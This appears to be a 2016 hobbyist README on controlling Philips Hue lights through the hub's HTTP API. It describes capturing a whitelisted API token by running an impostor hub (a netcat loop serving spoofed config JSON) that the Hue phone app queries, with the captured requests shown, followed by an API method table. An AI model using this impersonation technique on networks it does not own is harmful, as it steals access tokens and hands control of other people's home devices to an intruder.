hued - (?:ab)using the Hue HTTP API
====

- [writeup](#writeup)
- [API methods](#api-methods)
- [notes](#notes)

# writeup

want to talk to your [Philips Hue](http://www2.meethue.com/en-us/) lights directly through an HTTP API without registering an application?

to turn off the currently-in-use lighting scheme:

```
~/hue $ curl -X PUT http://<hue hub>/api/<token>/groups/0/action -d '{"on":true}'
[{"success":{"/groups/0/action/on":true}}]
```

all you need are:
  - the IP for the Hue Hub plugged in to your network
  - a 'whitelisted' token to talk to the API

finding the IP should be pretty straight forward, but the nmap output is not very specific:
```
~/hue $ nmap 192.168.42.0/24
...
Nmap scan report for 192.168.42.66
Host is up (0.0063s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE    VERSION
80/tcp open  tcpwrapped
...
```

the Hue hub uses DHCP by default, so it likely won't be at that address for you, but you get the idea.

now, you need to get a token. to do that, trick the Hue app on your phone/tablet/Echo to send it to us.

  - stand up a webserver listening for GET of `http://0.0.0.0:80/api/config` on the same network (0/24) your phone/tablet/Echo is on
  - `api/config` needs to be JSON that a Hue hub would return (sample included in repo)
  - from your phone/tablet/Echo, select `Settings->Find Bridge->Search`
    * this works intermittently, as some times the app found the real hub and the imposter, other times it would only find the real hub, but would mostly end up with a 'Specify IP' button
  - wait for the app to query your imposter, and you'll have a token

by the numbers:

```
~/hue $ cat api/config
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Expires: Mon, 1 Aug 2011 09:00:00 GMT
Connection: close
Access-Control-Max-Age: 3600
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE, HEAD
Access-Control-Allow-Headers: Content-Type
Content-type: application/json

{"name": "Philips hue","swversion": "01032318","apiversion": "1.13.0","mac": "DE:AD:BE:EF:CA:FE","bridgeid": "001788FFFECAFE","factorynew": false,"replacesbridgeid": null,"modelid": "BSB001"}
~/hue $ while true; do sudo nc -l 80 < api/config; done
...
GET /api/config HTTP/1.1
Host: 192.168.42.83
Accept: */*
Accept-Language: en-us
Connection: keep-alive
Accept-Encoding: gzip, deflate
User-Agent: Hue/1 CFNetwork/758.4.3 Darwin/15.5.0

GET /api/eKpsfhR9K1u32/config HTTP/1.1
Host: 192.168.42.83
Accept: */*
Accept-Language: en-us
Connection: keep-alive
Accept-Encoding: gzip, deflate
User-Agent: Hue/1 CFNetwork/758.4.3 Darwin/15.5.0

GET /api/eKpsfhR9K1u32 HTTP/1.1
Host: 192.168.42.83
Accept: */*
Accept-Language: en-us
Connection: keep-alive
Accept-Encoding: gzip, deflate
User-Agent: Hue/1 CFNetwork/758.4.3 Darwin/15.5.0
```

and now we have our token, `eKpsfhR9K1u32`. with that, we can call (all?) API methods

# API methods

api|description|GET|PUT
----|-----------|---------------|----------------
`/config/`|set and query existing settings|without token for unauthenticated, basic registration information, with token for light/device/schedule/sensor configuration|JSON matching schema validation|
`/lights/`|scan and query existing lights|JSON scan status|empty body to start a scan
`/sensors/`|scan and query existing sensors|JSON scan status|empty body to start a scan
`/scenes/`|set and query existing scenes|JSON scene list| /`<uuid>/lights/<id>/state => {"on":true,"xy":[0.5804,0.3995],"bri":253}`
`/schedules/`|set and query existing schedules/timers|JSON schedules/timers|`/<uuid> => {"name":"Alarm","autodelete":false,"localtime":"2016-06-20T16:20:00","description":"giants","status":"enabled","command":{"address":"/api/eKpsfhR9K1u32/groups/0/action","body":{"scene":"f55e38250-on-0"},"method":"PUT"}}`
`/groups/`|set and query scene (?) groupings|empty JSON|`/<id>/action => {"scene":"2fc89fcdb-on-0"}`

a few example request/responses:

```json
# http://192.168.42.66/api/eKpsfhR9K1u32/scenes
{
  "f4750b0cf-off-5": {
    "name": "HIDDEN foff 1452936620159",
    "lights": [
      "1",
      "2",
      "3",
      "4",
      "5",
      "6",
      "7",
      "8",
      "9",
      "10"
    ],
    "owner": "eKpsfhR9K1u32",
    "recycle": true,
    "locked": true,
    "appdata": {

    },
    "picture": "",
    "lastupdated": "2016-01-16T09:30:21",
    "version": 1
  },
  ...
}  
```

# notes

all versions tested are the latest available as of 2016/06/19

component|version|notes
---------|-------|-----
Philips Hue Hub|5.23.1.13452|
Hue mobile App|1.12.1.0|same version reported on both Android and Apple devices

TODO
* dig further in api/\<token\>/config
  * determine how the hashes are generated. not concatenation of create time / name in any obvious way. different devices seem to come up with hashes in different ways. older iPhone/iPad apps were [A-Z0-9]{16}, while Android ones seem to always have been [A-Z]{32}
* write a client library/binding? or at least some abstraction
* determine the truly necessary pieces of the imposter response, think it really only needs content-type and minimal JSON
* work on SSDP discovery, see [description.xml](description.xml)
